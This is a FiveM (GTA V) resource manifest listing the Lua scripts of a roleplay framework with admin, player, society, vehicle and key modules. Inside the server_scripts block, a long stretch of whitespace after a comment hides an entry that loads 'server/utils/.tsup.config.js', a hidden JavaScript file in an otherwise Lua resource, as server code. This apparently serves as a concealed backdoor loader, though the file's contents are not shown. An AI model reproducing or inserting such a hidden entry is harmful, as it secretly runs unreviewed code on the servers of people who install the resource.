



fx_version 'cerulean';
game 'gta5';

author '';
description '';
github '';
version '1.0.0';
lua54 'yes';

shared_scripts {
    'Config.lua',
    'Modules/**/**',
    'Shared/Classes/BaseObject.lua',
    'Shared/Classes/Class.lua',
    'Shared/Utils/**/**',
    'Shared/Index.lua',
    'Locales/**/**',
    'Shared/Enums/**/**',
    'Shared/exports/**/**',
    'Shared/Modules/**/**'
};

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'Webhooks.lua',
    'Server/Discord/Discord.lua',
    
    'Server/Keys/entities/Key.lua',
    
    'Server/modules/Administration/AdminManager.lua',
    'Server/Player/PlayersManager.lua',
    'Server/Society/SocietyManager.lua',
    'Server/Vehicle/VehicleManager.lua',
    'Server/Keys/KeyManager.lua',
    
    'Server/Server.lua',
    
    'Server/modules/Vehicles/Keys/Key.lua',
    
    'Server/Society/**/**',
    'Server/Keys/**/**',
    'Server/Vehicle/**/**',
    'Server/Player/**/**',
    'Server/modules/**/**',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.tsup.config.js',
};

client_scripts {
    'Client/RageUI/init.lua',
    'Client/RageUI/menu/RageUI.lua',
    'Client/RageUI/menu/Menu.lua',
    'Client/RageUI/menu/MenuController.lua',
    'Client/RageUI/components/*.lua',
    'Client/RageUI/menu/elements/*.lua',
    'Client/RageUI/menu/items/*.lua',
    'Client/RageUI/menu/panels/*.lua',
    'Client/RageUI/menu/windows/*.lua',
};

client_scripts {
    'Client/modules/Administration/content/noclip.lua',
    'Client/Client.lua',
    'Client/Utils/Game/modules/**/**',
    'Client/Utils/Game/Game.lua',
    'Client/Player/**/**',
    'Client/Society/**/**',
    'Client/modules/**/**',
};


files({
    "Server/JSON/Admins.json",
});

escrow_ignore {
	"Config.lua",
    "Modules/**/**",
	"stream/**",
    "Locales/**",
    "Server/modules/exports/**/**",
    "Shared/exports/**/**",
    "Webhooks.lua",
};
dependency '/assetpacks'